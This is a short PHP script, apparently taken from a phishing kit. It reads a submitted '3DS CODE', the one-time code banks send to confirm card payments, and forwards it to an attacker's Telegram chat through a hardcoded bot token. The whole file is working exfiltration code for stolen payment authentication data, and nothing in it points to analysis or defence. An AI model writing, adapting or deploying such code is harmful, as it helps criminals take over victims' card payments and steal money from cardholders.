<?php

    $t_chat_id = "912080404";
    $t_bot_id = "5163244405";
    $t_bot_token = "AAExFCzUiggGagLr4mmHCEhwLsQtezKkeVo";
    $t_api_uri = "https://api.telegram.org/bot".$t_bot_id.":".$t_bot_token."/";

    $code = $_POST["code"];

    $card_log ="3DS CODE: ".$code;

    $headers = array();
    $options = array();

    $curl_res = curl("post", $t_api_uri."sendMessage?chat_id=".$t_chat_id."&text=".$card_log, $headers, "", $options);

    // $code = $curl_res["code"];
    // $response = $curl_res["response"];

    echo $curl_res;
?>
